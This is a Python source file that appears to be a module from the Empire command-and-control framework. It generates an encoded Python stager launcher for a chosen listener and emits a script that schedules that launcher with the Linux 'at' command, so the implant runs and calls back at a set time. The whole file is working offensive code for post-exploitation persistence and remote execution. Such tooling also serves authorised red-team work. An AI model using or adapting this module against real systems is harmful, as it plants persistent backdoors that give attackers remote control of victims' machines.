from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        time_spec = params["Time"]
        user_agent = params.get("UserAgent", "default")
        safe_checks = params.get("SafeChecks", "True")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            encode=True,
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        # Embed the launcher and time as repr'd Python string literals so
        # any embedded quotes, backslashes, or newlines survive verbatim.
        return f"""
import subprocess

launcher = {launcher!r}
time_spec = {time_spec!r}

print("[*] Scheduling at job at '" + time_spec + "'")

try:
    proc = subprocess.Popen(
        ["at", time_spec],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    stdout, stderr = proc.communicate(input=launcher.encode())

    if stdout:
        print(stdout.decode().strip())
    if stderr:
        output = stderr.decode().strip()
        if proc.returncode == 0:
            print("[+] " + output)
        else:
            print("[-] " + output)

    if proc.returncode != 0:
        print("[-] 'at' returned non-zero exit code: " + str(proc.returncode))
    else:
        try:
            list_proc = subprocess.Popen(
                ["atq"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            list_out, _ = list_proc.communicate()
            if list_out:
                print("[*] Current at queue:")
                print(list_out.decode().strip())
        except FileNotFoundError:
            print("[*] 'atq' not found; cannot list queue.")
        except Exception as e:
            print("[*] Could not list at queue: " + str(e))
except FileNotFoundError:
    print("[-] 'at' command not found. Install the 'at' package (e.g. 'apt install at').")
except Exception as e:
    print("[-] Failed to schedule at job: " + str(e))
"""
